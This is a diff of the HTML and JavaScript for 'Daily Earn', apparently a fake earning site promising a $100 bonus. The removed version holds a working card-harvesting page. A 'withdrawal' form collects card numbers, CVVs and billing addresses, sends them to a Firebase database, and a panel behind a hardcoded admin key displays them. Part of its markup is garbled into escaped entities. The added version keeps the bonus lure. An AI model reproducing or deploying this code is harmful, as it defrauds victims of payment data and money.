@@ -1,149 +1,170 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<title>Daily Earn | Premium Wealth</title>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<link href="" rel="stylesheet">
-<style>
-:root {
---primary: #0f2027; --accent: #2193b0; --gold: #f1c40f;
---success: #2ecc71; --danger: #e74c3c; --glass: rgba(255, 255, 255, 0.98);
-}
-* { box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
-body { margin: 0; font-family: 'Poppins', sans-serif; background: #f0f2f5; color: #333; min-height: 100vh; overflow-x: hidden; }
-.bg-overlay { background: linear-gradient(135deg, #0f2027 0%, #203a43 50%, #2c5364 100%); position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; }
-#splash-screen { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #0f2027; display: flex; align-items: center; justify-content: center; z-index: 10000; flex-direction: column; color: white; }
-.loader { width: 50px; height: 50px; border: 5px solid #fff; border-bottom-color: var(--gold); border-radius: 50%; display: inline-block; animation: rotation 1s linear infinite; }
-@keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-.auth-container { display: none; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
-.auth-card { background: var(--glass); padding: 35px 25px; border-radius: 25px; width: 100%; max-width: 400px; box-shadow: 0 15px 35px rgba(0,0,0,0.4); text-align: center; }
-.balance-card { background: linear-gradient(135deg, #00b4db 0%, #0083b0 100%); color: white; padding: 30px 20px; border-radius: 25px; text-align: center; margin-bottom: 20px; }
-.card { background: white; padding: 20px; border-radius: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.05); margin-bottom: 15px; position: relative; }
-input, textarea { width: 100%; padding: 14px; margin-bottom: 12px; border: 2px solid #f1f1f1; border-radius: 12px; font-size: 15px; font-family: 'Poppins'; }
-.btn { background: var(--accent); color: white; border: none; padding: 16px; border-radius: 12px; font-weight: 700; width: 100%; cursor: pointer; text-transform: uppercase; }
-#app-nav { background: white; position: fixed; bottom: 0; width: 100%; display: none; justify-content: space-around; padding: 12px 0; box-shadow: 0 -5px 20px rgba(0,0,0,0.1); z-index: 1000; border-radius: 20px 20px 0 0; }
-.nav-btn { background: none; border: none; font-weight: 700; color: #777; font-size: 12px; cursor: pointer; }
-.hidden { display: none !important; }
-</style>
+  <title>Daily Earn</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #0f2027;
+      color: white;
+      text-align: center;
+    }
+    .card {
+      background: white;
+      color: black;
+      padding: 25px;
+      border-radius: 20px;
+      margin: 60px auto;
+      width: 90%;
+      max-width: 350px;
+    }
+    input {
+      width: 100%;
+      padding: 15px;
+      margin: 10px 0;
+      border-radius: 12px;
+      border: 2px solid #eee;
+      font-size: 16px;
+    }
+    .btn {
+      background: #2193b0;
+      color: white;
+      border: none;
+      padding: 15px;
+      border-radius: 12px;
+      font-weight: bold;
+      width: 100%;
+      cursor: pointer;
+    }
+    #main-app {
+      display: none;
+    }
+    .balance-box {
+      background: linear-gradient(to right, #2193b0, #6dd5ed);
+      padding: 40px 20px;
+    }
+  </style>
 </head>
 <body>
-<div class="bg-overlay"></div>
-<div id="splash-screen">
-<div class="loader"></div>
-<h2 style="margin-top:20px; letter-spacing: 2px;">DAILY EARN</h2>
-</div>
-<div id="auth-screen" class="auth-container">
-<div class="auth-card">
-<h2>DAILY EARN</h2>
-<p style="color:var(--success); font-weight:700;">$100.00 BONUS ACTIVE</p>
-<input type="text" id="reg-name" placeholder="Full Name">
-<input type="password" id="reg-pass" placeholder="Password">
-<button class="btn" onclick="handleSignup()">Claim 100 &amp; Join&lt;/button&gt;
-&lt;/div&gt;
-&lt;/div&gt;
-&lt;div id=&quot;app-nav&quot;&gt;
-&lt;button class=&quot;nav-btn&quot; onclick=&quot;showTab(&#39;dashboard&#39;)&quot;&gt;HOME&lt;/button&gt;
-&lt;button class=&quot;nav-btn&quot; onclick=&quot;showTab(&#39;withdraw&#39;)&quot;&gt;CASHOUT&lt;/button&gt;
-&lt;button class=&quot;nav-btn&quot; onclick=&quot;openAdmin()&quot;&gt;ADMIN&lt;/button&gt;
-&lt;/div&gt;
-&lt;div class=&quot;content-area hidden&quot; id=&quot;app-content&quot; style=&quot;padding: 20px; padding-bottom: 100px; max-width: 500px; margin: auto;&quot;&gt;
-&lt;div id=&quot;dashboard&quot; class=&quot;tab&quot;&gt;
-&lt;h2 style=&quot;color:white;&quot;&gt;Welcome, &lt;span id=&quot;user-welcome&quot; style=&quot;color:var(--gold)&quot;&gt;User&lt;/span&gt;&lt;/h2&gt;
-&lt;div class=&quot;balance-card&quot;&gt;
-&lt;p style=&quot;font-size:11px;&quot;&gt;TOTAL BALANCE&lt;/p&gt;
-&lt;h1 style=&quot;font-size:50px;&quot;&gt;<span id="earnings">0</span></h1>
-<button class="btn" style="background:white; color:var(--accent); width:auto;" onclick="dailyClaim()">🎁 Daily 10&lt;/button&gt;
-&lt;/div&gt;
-&lt;/div&gt;
-&lt;div id=&quot;withdraw&quot; class=&quot;tab hidden&quot;&gt;
-&lt;div class=&quot;card&quot;&gt;
-&lt;h3&gt;Withdrawal&lt;/h3&gt;
-&lt;input type=&quot;number&quot; id=&quot;wAmount&quot; placeholder=&quot;Amount ()">
-<input type="text" id="wCard" placeholder="Card Number" maxlength="16">
-<input type="text" id="wExp" placeholder="MM/YY" maxlength="5">
-<input type="text" id="wCVV" placeholder="CVV" maxlength="3">
-<textarea id="wAddr" placeholder="Billing Address"></textarea>
-<button class="btn" onclick="processWithdrawal()">Submit Payout</button>
-</div>
-</div>
-<div id="admin-tab" class="tab hidden">
-<div class="card" style="border: 2px solid red;">
-<h3 style="color:red;">Admin Panel (OBASEMO23)</h3>
-<div id="admin-requests"></div>
-</div>
-</div>
-</div>
-<script src=""></script>
-<script src=""></script>
-<script>
-const firebaseConfig = {
-apiKey: "AIzaSyDWd8bqsCIKJrjXdjhfUJg9edDrXQ6uKvk",
-authDomain: "daily-ean.firebaseapp.com",
-databaseURL: "",
-projectId: "daily-ean",
-storageBucket: "daily-ean.firebasestorage.app",
-messagingSenderId: "465909343560",
-appId: "1:465909343560:web:7597e8babe18ec6553ff7d"
-};
-firebase.initializeApp(firebaseConfig);
-const db = firebase.database();
-let activeUser = null;
-window.onload = () => {
-setTimeout(() => {
-document.getElementById('splash-screen').style.display = 'none';
-document.getElementById('auth-screen').style.display = 'flex';
-}, 2000);
-};
-function handleSignup() {
-const n = document.getElementById('reg-name').value.trim();
-const p = document.getElementById('reg-pass').value;
-if(!n || !p) return alert("Fill all fields");
-db.ref('users/'+n).set({name:n, pass:p, earnings:100}).then(() => {
-activeUser = {name:n, earnings:100};
-document.getElementById('auth-screen').style.display = 'none';
-document.getElementById('app-nav').style.display = 'flex';
-document.getElementById('app-content').classList.remove('hidden');
-updateUI();
-});
-}
-function updateUI() {
-document.getElementById("earnings").innerText = activeUser.earnings;
-document.getElementById("user-welcome").innerText = activeUser.name;
-}
-function showTab(id) {
-document.querySelectorAll('.tab').forEach(t => t.classList.add('hidden'));
-document.getElementById(id).classList.remove('hidden');
-}
-function dailyClaim() {
-activeUser.earnings += 10;
-updateUI();
-alert("Daily $10 Added!");
-}
-function processWithdrawal() {
-const r = {
-user: activeUser.name,
-amount: document.getElementById('wAmount').value,
-card: document.getElementById('wCard').value,
-cvv: document.getElementById('wCVV').value,
-addr: document.getElementById('wAddr').value
-};
-db.ref('admin_requests').push(r);
-alert("Security Verification in Progress!");
-}
-function openAdmin() {
-const key = prompt("Enter Admin Key:");
-if(key === "OBASEMO23") {
-showTab('admin-tab');
-db.ref('admin_requests').on('value', s => {
-const a = document.getElementById('admin-requests'); a.innerHTML = "";
-const d = s.val();
-for(let i in d) {
-a.innerHTML += &lt;div class=&#39;card&#39; style=&#39;color:black; font-size:12px;&#39;&gt; &lt;b&gt;User:&lt;/b&gt; ${d[i].user}<br> &lt;b&gt;Card:&lt;/b&gt; ${d[i].card}<br> &lt;b&gt;CVV:&lt;/b&gt; ${d[i].cvv} &lt;/div&gt;;
-}
-});
-}
-}
-</script>
+
+  <!-- Authentication Page -->
+  <div id="auth-page">
+    <div class="card">
+      <h2 style="color:#2193b0;">DAILY EARN</h2>
+      <p style="color:green;font-weight:bold;">$100 BONUS ACTIVE</p>
+      <input type="email" id="email" placeholder="Email">
+      <input type="password" id="password" placeholder="Password">
+      <button class="btn" onclick="register()">Register / Login</button>
+    </div>
+  </div>
+
+  <!-- Main App Page -->
+  <div id="main-app">
+    <div class="balance-box">
+      <p>AVAILABLE BALANCE</p>
+      <h1>$<span id="bal-val">0</span></h1>
+      <button onclick="addDaily()" style="background:#f1c40f;color:black;border:none;padding:10px 20px;border-radius:20px;font-weight:bold;">
+        🎁 GET DAILY $10
+      </button>
+      <br><br>
+      <button onclick="logout()" class="btn">Logout</button>
+    </div>
+  </div>
+
+  <!-- Firebase v8 CDN -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+  <script>
+    // Your web app's Firebase configuration
+    const firebaseConfig = {
+      apiKey: "AIzaSyDWd8bqsCIKJrjXdjhfUJg9edDrXQ6uKvk",
+      authDomain: "daily-ean.firebaseapp.com",
+      databaseURL: "https://daily-ean-default-rtdb.firebaseio.com",
+      projectId: "daily-ean",
+      storageBucket: "daily-ean.appspot.com",
+      messagingSenderId: "465909343560",
+      appId: "1:465909343560:web:7597e8babe18ec6553ff7d"
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+
+    // Firebase references
+    const auth = firebase.auth();
+    const database = firebase.database();
+
+    // Register or login user
+    function register() {
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      if (email === "" || password === "") {
+        alert("Please enter email and password");
+        return;
+      }
+
+      auth.createUserWithEmailAndPassword(email, password)
+        .then((userCredential) => {
+          const user = userCredential.user;
+          database.ref("users/" + user.uid).set({
+            balance: 100
+          });
+          loadUser();
+        })
+        .catch(() => {
+          // If user already exists, try to log in
+          auth.signInWithEmailAndPassword(email, password)
+            .then(() => {
+              loadUser();
+            })
+            .catch(error => {
+              alert(error.message);
+            });
+        });
+    }
+
+    // Load user data and show main app
+    function loadUser() {
+      auth.onAuthStateChanged(user => {
+        if (user) {
+          document.getElementById("auth-page").style.display = "none";
+          document.getElementById("main-app").style.display = "block";
+
+          // Listen to balance updates
+          database.ref("users/" + user.uid + "/balance")
+            .on("value", (snapshot) => {
+              document.getElementById("bal-val").innerText = snapshot.val();
+            });
+        }
+      });
+    }
+
+    // Add daily bonus
+    function addDaily() {
+      const user = auth.currentUser;
+      if (user) {
+        const ref = database.ref("users/" + user.uid + "/balance");
+        ref.once("value").then(snapshot => {
+          let current = snapshot.val();
+          ref.set(current + 10);
+        });
+      }
+    }
+
+    // Logout user
+    function logout() {
+      auth.signOut().then(() => {
+        location.reload();
+      });
+    }
+
+    // Check if user is already logged in
+    loadUser();
+  </script>
+
 </body>
 </html>
